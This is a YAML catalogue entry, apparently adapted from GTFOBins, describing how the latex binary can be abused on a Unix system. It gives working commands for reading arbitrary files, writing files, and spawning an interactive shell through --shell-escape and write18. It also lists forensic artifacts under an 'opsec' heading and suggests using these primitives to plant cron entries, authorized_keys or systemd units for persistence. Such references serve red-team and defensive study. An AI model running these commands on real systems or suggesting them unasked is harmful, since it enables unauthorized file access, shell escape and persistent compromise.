---
name: latex
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
    strings texput.dvi
  notes: The read file will be part of the PDF output.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
  notes: The file can only be written in the current directory, and the `.tex` extension is mandatory.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: latex --shell-escape '\immediate\write18{/bin/sh}'
references:
- https://gtfobins.github.io/gtfobins/latex/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
